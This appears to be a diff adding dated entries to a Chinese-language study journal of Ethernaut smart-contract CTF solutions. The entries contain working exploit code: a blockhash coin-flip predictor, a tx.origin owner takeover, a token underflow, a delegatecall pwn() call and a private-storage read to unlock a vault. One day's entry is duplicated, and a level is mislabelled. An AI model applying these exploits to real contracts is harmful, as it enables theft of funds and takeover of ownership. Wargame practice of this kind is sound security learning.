@@ -80,10 +80,144 @@ Rubixi hack
 >>##### Coin Flip
 >>##### 目標： 猜對10次
 >>##### 先備知識
->> - Blocks 是什麼
+>> - block.number?
 >> - 如何用Solidity和其他合約互動
 >> 
-### 2024.09.1
+### 2024.09.01
+
+>> - block.number
+>>   block.number 是當前 block 編號 並非真正隨機
+>>   可以很容易查詢到
+>> - 如何用Solidity和其他合約互動?
+>>   ```solidity
+>>   interface ICoinFlip {
+>>       function flip(bool _guess) external returns (bool);
+>>   }
+>>   ```
+>>   
+>>   ```solidity
+>>   contract Mycontract{
+>>       ICoinFlip(目標合約).flip(side);
+>>   }
+>>   ```
+>>   [參考影片](https://www.youtube.com/watch?v=YWtT0MNHYhQ)
+>>   試著產出和給的程式碼相同結果的合約執行10次
+>>   
+> > ```solidity
+> > // SPDX-License-Identifier: MIT
+> > pragma solidity ^0.8.24;
+> > 
+> > interface ICoinFlip{
+> >     function flip(bool _guess) external returns (bool);
+> > }
+> > contract solveFlip{
+> >     uint256 public myConsecutiveWins;
+> >     uint256 lastHash;
+> >     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+> >     constructor() {
+> >     myConsecutiveWins = 0;
+> >     }
+> >     function guessCorrect(address _CoinFlip) external returns(bool isSuccess){
+> > 
+> >         uint256 blockValue = uint256(blockhash(block.number - 1));
+> >         if(lastHash == blockValue) {
+> >             revert();
+>>         }
+>>         
+>>         lastHash = blockValue;
+>>         uint256 coinFlip = blockValue / FACTOR;
+>>         bool side = coinFlip == 1 ? true : false;
+>>         return ICoinFlip(_CoinFlip).flip(side);
+>>     }
+>> }
+>> ```
+>> 通關~
+
+### 2024.09.02
+>#### Ethernaut CTF (5/31)
+>>##### Telephone
+>>##### 目標： 成為owner
+>>##### 先備知識
+>> - tx.origin 和 msg.sender 的不同
+>> ###### 解題
+>> 設計一個由contract地址幫玩家交互的function執行
+>> 
+>>```solidity
+>>// SPDX-License-Identifier: MIT
+>>pragma solidity ^0.8.24;
+>>interface ITelephone{
+>>    function changeOwner(address _owner) external;
+>>}
+>>contract solvetele{
+>>    function helpMechageOwner(address _contrect) public{
+>>        ITelephone(_contrect).changeOwner(msg.sender);
+>>    }
+>> }
+>>```
+>#### Ethernaut CTF (6/31)
+>>##### Token
+>>##### 目標： 得到更多tokens，最好大量
+>>##### 先備知識
+>> -  Underflow and Overflow
 
 
+### 2024.09.03
+>> ###### 解題
+>> 1. uint256 範圍 0 ~ 2²⁵⁶ — 1.
+>> 2. trasfer function 並沒有檢查扣完後會不會underflow
+>>    ```solidity
+>>     function transfer(address _to, uint256 _value) 
+>>     public returns (bool) {
+>>         require(balances[msg.sender] - _value >= 0);
+>>         balances[msg.sender] -= _value;
+>>         balances[_to] += _value;
+>>         return true;
+>>     }
+>>    ``` 
+>> 3.把transfer的數量大於持有的數量
+>>   `contract.transfer(contract.address, 21)`
+>> 4.`await contract.balanceOf(player)`會發現持有超多token
+>> 通關~
+>> 
+>#### Ethernaut CTF (7/31)
+>>##### Delegation
+>>##### 目標： 成為owner
+>>##### 先備知識
+>> - [delegatecall](https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how)
+>> - [encodeFunctionSignature](https://www.rareskills.io/post/abi-encoding)
+>> ###### 解題
+>> 1.取得signature `signature = web3.eth.abi.encodeFunctionSignature("pwn()")`
+>>2.利用sendTransaction 觸發callback `contract.sendTransaction({ from: player, data: signature })`
+>>3.成為owner
+
+### 2024.09.04
+>#### Ethernaut CTF (7/31)
+>>##### Delegation
+>>##### 目標：強迫收款
+>>##### 先備知識
+>> - [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/) deprecate
+>> 一個把當前合約毀滅並把剩餘ether轉換到指定地址
+>> ###### 解題 (失敗)
+
+
+### 2024.09.04
+>#### Ethernaut CTF (7/31)
+>>##### Delegation
+>>##### 目標：強迫收款
+>>##### 先備知識
+>> - [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/) deprecate
+>> 一個把當前合約毀滅並把剩餘ether轉換到指定地址
+>> ###### 解題 (失敗)
+
+>#### Ethernaut CTF (8/31)
+>>##### Vault
+>>##### 目標：Unlock the vault
+
+### 2024.09.05
+>>##### 先備知識
+>> - 如何使用`getStorageAt`獲取變數
+>> >>https://docs.soliditylang.org/en/v0.8.10/internals/layout_in_storage.html
+>> 1.
+>> contract.unlock(await web3.eth.getStorageAt(contract.address, 1))
+>> 2.得到答案
 <!-- Content_END -->
